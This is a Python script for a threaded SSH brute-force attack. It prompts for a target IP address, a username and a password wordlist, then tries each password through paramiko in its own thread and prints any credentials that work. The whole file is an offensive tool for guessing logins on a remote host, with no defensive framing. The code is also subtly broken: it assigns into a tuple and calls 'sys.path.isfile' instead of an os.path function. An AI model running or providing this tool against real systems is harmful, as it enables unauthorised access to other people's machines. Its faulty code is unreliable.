import os
import sys
import threading
import time

import paramiko
import termcolor

from portScanner import check_ip

stop_flag = 0


def ssh_connect(host, username, password):
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=22, username=username, password=password)
        stop_flag = 1
        termcolor.cprint(
            termcolor.colored('[+] Found Password: ', 'green')
            + termcolor.colored(password, 'yellow')
            + termcolor.colored((', For Account: ' + username), 'yellow'))
    except:
        termcolor.cprint(termcolor.colored(('[-] Incorrect Login: ' + password), 'red'))
    finally:
        ssh.close()


if __name__ == '__main__':
    try:
        the_right_input = False, False, False
        while not the_right_input[0]:  # Keep repeating the question until user inputs are valid
            host = input('[+] Target Address: ').strip(' ')
            # for every ip address in the inputted targets target
            if check_ip(host)[1]:  # check if its a valid ip
                the_right_input[0] = True
            else:  # if not print the error and ask the question again
                print(host + ' not an ip address')

        while not the_right_input[1]:
            username = input('[+] Enter SSH Username: ')
            ans = input("Is " + username + " correct?")
            if 'y' in ans:
                the_right_input[1] = True
            else:
                pass

        while not the_right_input[2]:
            input_file = str(input('[+] Password File: '))
            if not sys.path.isfile(input_file):
                print('File not found\nTry again')
            else:
                the_right_input[2] = True

        print('* * * Starting Threaded SSH Bruteforce On ' + host + ' With Account: ' + username + '* * *')

        with open(input_file, 'r') as file:
            for line in file.readlines():
                if stop_flag == 1:
                    t.join()
                    exit()
                password = line.strip()
                t = threading.Thread(target=ssh_connect, args=(host, username, password,))
                t.start()
                time.sleep(0.5)
    except KeyboardInterrupt:
        print('bye')
        exit(0)
